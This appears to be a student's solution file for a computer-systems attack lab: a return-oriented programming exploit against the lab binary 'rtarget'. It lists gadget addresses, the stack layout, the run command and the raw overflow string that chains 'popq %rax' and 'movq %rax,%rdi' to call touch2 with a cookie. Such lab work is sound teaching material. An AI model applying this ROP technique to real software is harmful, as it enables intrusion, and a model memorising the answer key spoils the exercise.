/*
You are only allowed to use movq, popq, ret and nop. You need to move value of cookie 
into register (rdi) and go to an address of touch2. The strategy is to include the cookie in 
the exploit string. The executed code should pop the stack into %rdi, to pass 
cookie as argument. you should search in file (farm.o) for instruction pop %rdi (in hexa 5f)



IMPORTANT POINTS 
1-All the gadgets you need can be found in the region of the code for rtarget demarcated by the
functions start_farm and mid_farm.
2-You can do this attack with just two gadgets.
3-When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit
string will contain a combination of gadget addresses and data
4-to search about hexa code in file farm.o 
objdump -d farm.o | less
/....   write hexa representation for an instruction
but address in farm.o is virsual , so search in rtarget file for physical address
objdump -d rtarget.o | less
/....   write hexa representation for an instruction


STEPS :
when you search about 5f (pop rdi) , it is'nt found ,but we found instruction 58 (pop rax) 
pop rax
mov rax, rdi
go to touch 

0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   


cookie: 0x59b997fa

movq %rax,%rdi ==> 48 89 c7
popq %rax ==> 58

there are many addresses contain these instruction ,for example

0x40 19 ab: "58 90 c3" encodes "popq %rax; nop; ret"
0x40 19 a2: "48 89 c7 c3" encodes "movq %rax,%rdi; ret"
0x40 17 ec: address of touch 2


The stack after getbuf() returns:
---------------------------
|00 00 00 00 00 40 17 ec  | 0x5561dcb8, points to touch2(). 
---------------------------
|00 00 00 00 00 40 19 a2  | 0x5561dcb0, points to "movq %rax,%rdi; ret"
---------------------------
|00 00 00 00 59 b9 97 fa  | 0x5561dca8, the cookie value
---------------------------
|00 00 00 00 00 40 19 ab  | 0x5561dca0, return address after calling getbuf(), points to "popq %rax; nop; ret"
---------------------------


./hex2raw < ROP-level2/ROP-level2-solution.txt | ./rtarget -q
*/

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00